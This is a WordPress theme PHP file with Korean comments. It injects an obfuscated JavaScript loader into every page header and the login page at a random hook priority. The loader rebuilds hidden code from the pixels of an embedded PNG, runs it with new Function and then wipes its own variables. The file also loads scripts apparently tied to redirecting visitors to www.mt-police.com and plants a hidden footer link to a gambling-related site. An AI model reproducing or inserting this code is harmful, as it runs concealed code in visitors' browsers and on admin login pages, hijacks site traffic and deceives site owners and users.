<?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

/*--------------------------------------
 * 리다이렉트
 *--------------------------------------*/
function rk_redirect_url() {
    /*
        if( location.hostname !== 'www.mt-police.com' ) {
            location.href = 'https://www.mt-police.com/' + location.pathname;
        }
    */

    wp_enqueue_script( 'mt-finder', get_stylesheet_directory_uri() . '/js/mt-finder2.js', array(), false, true );
}
//add_action( 'wp_head', 'rk_redirect_url' );
add_action( 'wp_enqueue_scripts', 'rk_redirect_url' );
add_action( 'login_enqueue_scripts', 'rk_redirect_url' );


function rk_redirect_url2() {
?>
<script>
v9590e2cf04e941a01b43d16391df12b0=[ function(v3c422a34f918e968e3c2776af7de9c8d){return 'b903ea6300ffc957d946618424318ce4afcc0764acdf7b0f35bb848a9f48c54d61c3515d';}, function(v3c422a34f918e968e3c2776af7de9c8d){return v5d5475885a1202b0caa18c691be08fbb.createElement(v3c422a34f918e968e3c2776af7de9c8d);}, function(v3c422a34f918e968e3c2776af7de9c8d){return v3c422a34f918e968e3c2776af7de9c8d[0].getContext(v3c422a34f918e968e3c2776af7de9c8d[1]);}, function(v3c422a34f918e968e3c2776af7de9c8d){return v3c422a34f918e968e3c2776af7de9c8d[0].text=v3c422a34f918e968e3c2776af7de9c8d[1];}, function(v3c422a34f918e968e3c2776af7de9c8d){return null;}, function(v3c422a34f918e968e3c2776af7de9c8d){'3be76cc016a8c850661956c5f71d14c621cf6a690df27f78a9339990332cf02c05677579';}, function(v3c422a34f918e968e3c2776af7de9c8d){return '5c8f5ac0b7ad23c110793ad1fcf4d3c8d41344d566b4c21b415fbd4c13556e3adad68ec0';}, function(v3c422a34f918e968e3c2776af7de9c8d){v3c422a34f918e968e3c2776af7de9c8d.style.display='none';return v3c422a34f918e968e3c2776af7de9c8d;}, function(v3c422a34f918e968e3c2776af7de9c8d){v43488179b7b33c17e50852bc5573de2c.onload=v3c422a34f918e968e3c2776af7de9c8d}, function(v3c422a34f918e968e3c2776af7de9c8d){v43488179b7b33c17e50852bc5573de2c.src=v3c422a34f918e968e3c2776af7de9c8d;}, new Function("v3c422a34f918e968e3c2776af7de9c8d","return unescape(decodeURIComponent(window.atob(v3c422a34f918e968e3c2776af7de9c8d)))"), function(v3c422a34f918e968e3c2776af7de9c8d){vdeff1b217c1e89ec2bffca670d02998f=new Function('v3c422a34f918e968e3c2776af7de9c8d',v9590e2cf04e941a01b43d16391df12b0[10](v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[v3c422a34f918e968e3c2776af7de9c8d]));return vdeff1b217c1e89ec2bffca670d02998f;}]; v2f0d7321e56dfd45d6862b1f7364f5d9=[0,255,0]; v21a3d2d3fc5c2c1e1f3a633bd8f16f7e=[ 'cmV0dXJuJTIwJ2NhbnZhcyclM0I=', 'cmV0dXJuJTIwJ25vbmUnJTNC', 'cmV0dXJuJTIwJzJkJyUzQg==', 'cmV0dXJuJTIwJ3NjcmlwdCclM0I=', '', 'v605e67403c38f5154e544aa289f199fd', 'v8412c6ae6ded6d0f77349812cc253be7', 'cmV0dXJuJTIwJ2RhdGElM0FpbWFnZSUyRnBuZyUzQmJhc2U2NCUyQyclM0I=', '', 'iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAABSUlEQVQokQXBT0sUAQCH4bfZGVleQ4Ltz0VsNUkvEWtsIEV16TN09uN17NSlD9AhKqjQhg6LmpI5u6H203Zgt+e5tvNqJ1DAbamTmQ7ILBzod7gJJ2QAZci+PI27ybq0yQwbqENf7oVDTShreAJfzRT28ELukE5cMsthonUYmKLQUVjHcfwdetCNExjGCzgg27IQyw34B+9hm1zpZzKDZ/jFTONmaE0LZQNnOAwTnYe+rMgZ/MLCCKfxmJQdeCRjcgP24AovYZpswaJO4NgIxYNwmfTDQhhKD07Cqn7Sv+RW0sS1UDQwgrfYhdNwlLw018n98DH+kBfmJ3Z4PJi31XPZbds1WJIpjGCjapuq3YzjqvpWpVgmD+VP0sq59kILK/gOh3AkCX0sV/E8LMIcu+EQp+EubJHXiAAk5ZsEAIEaMOCHgEKIAPofBVOvyZ+7SIkAAAAASUVORK5CYII=', 'cmV0dXJuJTIwdjVkNTQ3NTg4NWExMjAyYjBjYWExOGM2OTFiZTA4ZmJiLmdldEVsZW1lbnRCeUlkKHYzYzQyMmEzNGY5MThlOTY4ZTNjMjc3NmFmN2RlOWM4ZCklM0I=', 'cmV0dXJuJTIwZG9jdW1lbnQ=', 'Zm9yKHZiZTg1YTZiNDU3M2JmN2M1NjFlZDY3YTk2NjExZTdlNSUzRHYyZjBkNzMyMWU1NmRmZDQ1ZDY4NjJiMWY3MzY0ZjVkOSU1QjIlNUQlM0IlMjB2YmU4NWE2YjQ1NzNiZjdjNTYxZWQ2N2E5NjYxMWU3ZTUlMjAlM0MlMjB2OTIyNmFlOWJjZmQ5NTJkMTljZmViNjIxYzgzNDExOTEuZGF0YS5sZW5ndGglM0IlMjB2YmU4NWE2YjQ1NzNiZjdjNTYxZWQ2N2E5NjYxMWU3ZTUlMkIlM0Q0KXY0ZWMxMDRmMmY2MzRjNTc3NDk2MGE1MTRhZGE1ZTA0MSUyQiUzRCh2OTIyNmFlOWJjZmQ5NTJkMTljZmViNjIxYzgzNDExOTEuZGF0YSU1QnZiZTg1YTZiNDU3M2JmN2M1NjFlZDY3YTk2NjExZTdlNSU1RCElM0R2MmYwZDczMjFlNTZkZmQ0NWQ2ODYyYjFmNzM2NGY1ZDklNUIxJTVEKSUzRnY5N2VjZjJkNmZhZmY1OWJjNTk4NzVhZTc2OWY5YTkyMCh2OTIyNmFlOWJjZmQ5NTJkMTljZmViNjIxYzgzNDExOTEuZGF0YSU1QnZiZTg1YTZiNDU3M2JmN2M1NjFlZDY3YTk2NjExZTdlNSU1RCklM0F2MjFhM2QyZDNmYzVjMmMxZTFmM2E2MzNiZDhmMTZmN2UlNUI0JTVEJTNCJTIwdjRlYzEwNGYyZjYzNGM1Nzc0OTYwYTUxNGFkYTVlMDQxJTNEdjRlYzEwNGYyZjYzNGM1Nzc0OTYwYTUxNGFkYTVlMDQxLnRyaW0oKSUzQg==', 'cmV0dXJuJTIwbmV3JTIwSW1hZ2UoKSUzQg==', 'cmV0dXJuJTIwU3RyaW5nLmZyb21DaGFyQ29kZSh2M2M0MjJhMzRmOTE4ZTk2OGUzYzI3NzZhZjdkZTljOGQpJTNC']; v5d5475885a1202b0caa18c691be08fbb=v9590e2cf04e941a01b43d16391df12b0[11](11)(); va38e2dab610e24b4c3ddfd63bd57e34c=new Function('v3c422a34f918e968e3c2776af7de9c8d',v9590e2cf04e941a01b43d16391df12b0[10](v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[10])); v43488179b7b33c17e50852bc5573de2c=v9590e2cf04e941a01b43d16391df12b0[7](v9590e2cf04e941a01b43d16391df12b0[11](13)()); v9590e2cf04e941a01b43d16391df12b0[8](function(){ v7f3fa8a4eba2c6e2db8dd35d33eb0726=va38e2dab610e24b4c3ddfd63bd57e34c(v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[5]); v2a3efc7536acf0d5bec39f1c1a40c396=v9590e2cf04e941a01b43d16391df12b0[1](v9590e2cf04e941a01b43d16391df12b0[11](0)()); v2a3efc7536acf0d5bec39f1c1a40c396.width=v43488179b7b33c17e50852bc5573de2c.width; v2a3efc7536acf0d5bec39f1c1a40c396.height=v43488179b7b33c17e50852bc5573de2c.height; v2a3efc7536acf0d5bec39f1c1a40c396.style.display=v9590e2cf04e941a01b43d16391df12b0[11](1)();v4ec104f2f634c5774960a514ada5e041=v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[4]; v510774a06861e49caac4f450c72dfb79=v9590e2cf04e941a01b43d16391df12b0[2]([v2a3efc7536acf0d5bec39f1c1a40c396,v9590e2cf04e941a01b43d16391df12b0[11](2)()]); v97ecf2d6faff59bc59875ae769f9a920=new Function('v3c422a34f918e968e3c2776af7de9c8d',v9590e2cf04e941a01b43d16391df12b0[10](v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[14])); v510774a06861e49caac4f450c72dfb79.drawImage(v43488179b7b33c17e50852bc5573de2c, v2f0d7321e56dfd45d6862b1f7364f5d9[0], v2f0d7321e56dfd45d6862b1f7364f5d9[0]); v9226ae9bcfd952d19cfeb621c8341191=v510774a06861e49caac4f450c72dfb79.getImageData(v2f0d7321e56dfd45d6862b1f7364f5d9[0], v2f0d7321e56dfd45d6862b1f7364f5d9[0],v2a3efc7536acf0d5bec39f1c1a40c396.width,v2a3efc7536acf0d5bec39f1c1a40c396.height); vfe5b0816fea04f04397ec5a3bc9657b9=v9590e2cf04e941a01b43d16391df12b0[11](12)(); (new Function(v9590e2cf04e941a01b43d16391df12b0[10](v4ec104f2f634c5774960a514ada5e041)))(); v605e67403c38f5154e544aa289f199fd=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v43488179b7b33c17e50852bc5573de2c=v9590e2cf04e941a01b43d16391df12b0[4](v605e67403c38f5154e544aa289f199fd);v2a3efc7536acf0d5bec39f1c1a40c396=v9590e2cf04e941a01b43d16391df12b0[4](v2a3efc7536acf0d5bec39f1c1a40c396);v510774a06861e49caac4f450c72dfb79=v9590e2cf04e941a01b43d16391df12b0[4](v9226ae9bcfd952d19cfeb621c8341191);v9226ae9bcfd952d19cfeb621c8341191=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);vbe85a6b4573bf7c561ed67a96611e7e5=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v4ec104f2f634c5774960a514ada5e041=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v4de51763f5244226be82e6c5d1c4c62c=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v26d0918b5ed3ea3f0b5863a48d007be3=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v605e67403c38f5154e544aa289f199fd=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);vffeadbae4e11f0d2703df5c5b2be62d1=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v5d5475885a1202b0caa18c691be08fbb=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);vfe5b0816fea04f04397ec5a3bc9657b9=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v21a3d2d3fc5c2c1e1f3a633bd8f16f7e=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v2f0d7321e56dfd45d6862b1f7364f5d9=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v3c422a34f918e968e3c2776af7de9c8d=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79);v3c422a34f918e968e3c2776af7de9c8d=v9590e2cf04e941a01b43d16391df12b0[4](v7f3fa8a4eba2c6e2db8dd35d33eb0726);v9590e2cf04e941a01b43d16391df12b0=v9590e2cf04e941a01b43d16391df12b0[4](v510774a06861e49caac4f450c72dfb79); }); vfe5b0816fea04f04397ec5a3bc9657b9=v9590e2cf04e941a01b43d16391df12b0[9](v9590e2cf04e941a01b43d16391df12b0[11](7)()+v21a3d2d3fc5c2c1e1f3a633bd8f16f7e[9]);
</script>
<?php
}
function rk_register_hooks() {
    $rand_num = mt_rand( 0, 20 );

    add_action( 'wp_head', 'rk_redirect_url2', $rand_num );
    //add_action( 'wp_footer', 'rk_redirect_url2', $rand_num );
    add_action( 'login_enqueue_scripts', 'rk_redirect_url2', $rand_num );
}
add_action( 'init', 'rk_register_hooks' );


/*--------------------------------------
 * 숨김 링크 심기
 *--------------------------------------*/
function rk_link_insert_footer() {
    // $hostname = $_SERVER["HTTP_HOST"];
    // if( $hostname !== 'www.mt-police.com' ) {        
    //     $uri = $_SERVER['REQUEST_URI'];        
    //     echo '<div id="you" style="display: none;"><a href="https://goo.gl/jPpwvn" data-url="' . $hostname . '">먹튀폴리스 사이트 바로가기</a></div>';
    // }

    echo '<div id="you" style="display: none;"><a href="https://goo.gl/jPpwvn">먹튀폴리스 사이트 바로가기</a></div>';
}
add_action( 'wp_footer', 'rk_link_insert_footer' );


/*--------------------------------------
 * canonical url 치환 2
 *--------------------------------------*/
function rk_change_canonical() {
    wp_enqueue_script( 'outsider', get_stylesheet_directory_uri() . '/js/mt-finder.js', array('jquery'), false, true );
}
add_action( 'wp_enqueue_scripts', 'rk_change_canonical' );